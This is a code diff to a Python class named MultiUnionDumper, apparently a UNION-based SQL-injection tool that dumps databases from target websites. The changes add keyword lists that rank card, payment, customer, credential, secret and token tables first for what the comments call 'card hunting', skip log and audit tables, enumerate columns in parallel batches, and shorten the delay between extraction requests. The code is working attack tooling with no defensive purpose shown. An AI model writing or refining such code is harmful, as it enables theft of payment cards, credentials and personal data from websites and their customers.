@@ -295,9 +295,9 @@ class MultiUnionDumper:
 
         # Config
         self.enabled = True
-        self.max_tables = 30
+        self.max_tables = 20
         self.max_rows = 500
-        self.timeout = 15.0
+        self.timeout = 12.0
         self.max_cols_per_table = 30
 
         if config:
@@ -411,13 +411,28 @@ class MultiUnionDumper:
             tables = await self._enum_tables(profile, session)
             self.stats["tables_enumerated"] += len(tables)
 
-            # Step 6: Enumerate columns for each table
-            for table in tables[:self.max_tables]:
-                cols = await self._enum_columns(profile, session, table)
-                if cols:
-                    result.tables[table] = cols[:self.max_cols_per_table]
+            # ── Smart table prioritization: card/payment tables first, junk skipped ──
+            tables = self._prioritize_tables(tables)
 
-            # Step 7: Extract data from high-value tables
+            # Step 6: Enumerate columns for priority tables (parallel batches of 5)
+            async def _enum_one(tbl):
+                cols = await self._enum_columns(profile, session, tbl)
+                return (tbl, cols[:self.max_cols_per_table] if cols else [])
+
+            table_limit = min(self.max_tables, len(tables))
+            for batch_start in range(0, table_limit, 5):
+                batch = tables[batch_start:batch_start + 5]
+                enum_results = await asyncio.gather(
+                    *[_enum_one(t) for t in batch], return_exceptions=True
+                )
+                for er in enum_results:
+                    if isinstance(er, Exception):
+                        continue
+                    tbl, cols = er
+                    if cols:
+                        result.tables[tbl] = cols
+
+            # Step 7: Extract data — high-value tables first (already sorted)
             for table, columns in result.tables.items():
                 rows = await self._extract_rows(profile, session, table, columns)
                 if rows:
@@ -642,6 +657,55 @@ class MultiUnionDumper:
         return ""
 
     # ─────────────────────────────────────────────
+    #   SMART TABLE PRIORITIZATION
+    # ─────────────────────────────────────────────
+
+    # Tables most likely to contain card/payment data — dump FIRST
+    _HIGH_VALUE_KEYWORDS = {
+        'card', 'cards', 'credit_card', 'creditcard', 'cc', 'payment', 'payments',
+        'transaction', 'transactions', 'order', 'orders', 'customer', 'customers',
+        'user', 'users', 'account', 'accounts', 'billing', 'invoice', 'invoices',
+        'checkout', 'charge', 'charges', 'subscription', 'subscriptions',
+        'wallet', 'wallets', 'member', 'members', 'client', 'clients',
+        'purchase', 'purchases', 'sale', 'sales', 'receipt', 'receipts',
+        'credential', 'credentials', 'secret', 'secrets', 'token', 'tokens',
+        'admin', 'admins', 'staff', 'employee', 'employees', 'person', 'people',
+    }
+    # Tables that are worthless for card hunting — skip entirely
+    _JUNK_KEYWORDS = {
+        'log', 'logs', 'session', 'sessions', 'cache', 'migration', 'migrations',
+        'schema_', 'django_', 'wp_comment', 'wp_post', 'wp_term', 'wp_link',
+        'revision', 'revisions', 'audit', 'cron', 'queue', 'job', 'jobs',
+        'failed_job', 'password_reset', 'notification', 'notifications',
+        'telescope', 'horizon', 'pulse', 'health_check', 'analytics',
+        'pageview', 'visitor', 'click', 'impression', 'seo', 'redirect',
+        'setting', 'settings', 'config', 'configuration', 'option', 'options',
+        'meta', 'metadata', 'tag', 'tags', 'category', 'categories',
+        'media', 'attachment', 'upload', 'file', 'files', 'image', 'images',
+    }
+
+    def _prioritize_tables(self, tables: List[str]) -> List[str]:
+        """Sort tables: card/payment tables first, junk tables removed."""
+        high = []
+        normal = []
+        for t in tables:
+            tl = t.lower()
+            # Skip junk tables entirely
+            if any(junk in tl for junk in self._JUNK_KEYWORDS):
+                continue
+            # Prioritize high-value tables
+            if any(kw in tl for kw in self._HIGH_VALUE_KEYWORDS):
+                high.append(t)
+            else:
+                normal.append(t)
+        # High-value first, then others
+        prioritized = high + normal
+        if high:
+            logger.info(f"Table priority: {len(high)} high-value, {len(normal)} other, "
+                        f"{len(tables) - len(prioritized)} junk skipped")
+        return prioritized
+
+    # ─────────────────────────────────────────────
     #   TABLE ENUMERATION
     # ─────────────────────────────────────────────
 
@@ -801,7 +865,7 @@ class MultiUnionDumper:
                 else:
                     break
 
-            await asyncio.sleep(0.3)
+            await asyncio.sleep(0.05)
 
         logger.info(f"Extracted {len(all_rows)} rows from {table}")
         return all_rows
